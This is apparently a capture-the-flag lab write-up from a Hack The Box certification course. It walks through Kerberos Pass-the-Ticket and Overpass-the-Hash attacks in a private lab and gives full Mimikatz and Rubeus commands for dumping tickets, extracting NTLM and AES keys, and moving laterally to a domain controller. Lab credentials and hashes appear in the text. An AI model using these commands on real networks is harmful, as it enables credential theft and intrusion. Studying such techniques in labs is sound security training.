# Pass the Ticket (PtT) Attack | HTB Password Attacks
**Category:** HTB CPTS Certification Lab  
**Date:** January 2026

> ### ðŸ›¡ï¸ Ethical Hacking Disclaimer
> *This write-up is for educational purposes only. All activities were performed in a controlled, private lab environment provided by Hack The Box (HTB). Unauthorized access to computer systems is illegal and unethical.*
 ## 1. Introduction Pass the Ticket (PtT) is a post-exploitation technique where an attacker uses a stolen Kerberos ticket (TGT or TGS) to authenticate to a remote system without knowing the userâ€™s plaintext password. This technique relies on the Kerberos protocolâ€™s design, where the ticket itself is the proof of identity. In this lab, we start with administrative access to a compromised member server (MS01). Our objective is to enumerate cached Kerberos tickets, extract cryptographic key material (AES/NTLM) for a target user (john), and use those artifacts to move laterally to the Domain Controller (DC01) to retrieve sensitive flags. Disclaimer: This write-up is for educational purposes only and follows the guidelines of the Hack The Box Academy. All attacks were performed in a controlled lab environment. 2. Execution Phase Step 1: Access and Enumeration Q1 Objective: Connect to the target machine and identify logged-on users with valid Kerberos tickets. We began by establishing a remote desktop connection to the target host 10.129.204.23 using the provided credentials. xfreerdp3 /v:'10.129.204.23' /u:'Administrator' /p:'AnotherC0mpl3xP4$$' Upon successful login, we launched a Command Prompt as Administrator and navigated to the tools directory (C:\\tools). To assess the current Kerberos state, we utilized Rubeus, a C# toolset for raw Kerberos interaction and abuses. navigate to the tools directory #using-Rubeus Rubeus.exe dump /nowrap Rubeus Output Findings: The output displayed valid TGTs for several accounts. We observed tickets ending in $, which correspond to computer accounts (e.g., MS01$@inlanefreight.ht), and user tickets formatted as user@domain. Identified Users: john, julios, and david. Target User: We focused on john@inlanefreight.htb. Q1 Answer is 3 Note :The tickets that end with â€˜$â€™ correspond to the computer account, for example here : MS01$@inlanefreight.htb User tickets have the userâ€™s name, followed by an â€˜@â€™ that separates the service name and the domain, for example in this lab : john@inlanefreight.htb Step 2: Harvesting Credentials & Accessing File Shares Q2 Objective: Extract key material to perform an â€œOverpass-the-Hashâ€ attack and access a restricted network share. With the target user identified, we used Mimikatz to extract the encryption keys associated with the current session. mimikatz.exe privilege::debug sekurlsa::ekeys extract the encryption keys We successfully extracted the AES256 and NTLM (RC4) keys for the user john. Using the NTLM hash (rc4\_hmac\_nt), we performed a Pass-the-Hash attack to spawn a new command prompt running under john's context. sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2 Pass-the-Hash attack From this new session, we verified access to the Domain Controllerâ€™s file share via SMB: dir \\\\DC01.inlanefreight.htb\\john type \\\\DC01.inlanefreight.htb\\john\\john.txt Result: The flag was successfully retrieved from the text file. User Flag Step 3: Lateral Movement via PowerShell Remoting Q3 Objective: Escalate access from simple file sharing to full Remote Code Execution (RCE) on the Domain Controller. To interact with the Domain Controller via PowerShell Remoting (Enter-PSSession), we required a valid TGT injected into our session. We utilized Rubeus to request a new TGT using the AES256 key found in Step 2. Command Breakdown: createnetonly: Spawns a process that only uses the new credentials for network authentication, preventing the erasure of existing TGTs. asktgt /ptt: Requests a TGT and immediately imports ("Pass-the-Ticket") it into the current session. # Spawn a discrete process Rubeus.exe createnetonly /program:"C:\\Windows\\System32\\cmd.exe" /show #New cmd Window will open #Then... # Request and Import TGT using AES256 key Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt Import TGT using AES256 key With the ticket imported, we launched PowerShell and connected to the Domain Controller: #1 powershell #2 PS C:\\tools> Enter-PSSession -ComputerName DC01pp We verified our identity as inlanefreight\\john on hostname DC01, browsed to C:\\, and retrieved the final flag. Final Flag 3. Conclusion In this lab, we demonstrated the versatility of Kerberos abuse. By compromising a single endpoint, we were able to harvest credential material (keys) from memory and leverage them to move laterally. We used Mimikatz for Overpass-the-Hash (using NTLM) to access file resources. We used Rubeus for Pass-the-Ticket (using AES) to gain full remote execution. This highlights the critical importance of protecting privileged sessions, as any cached ticket or key on a compromised host can be weaponized to pivot deeper into the network.
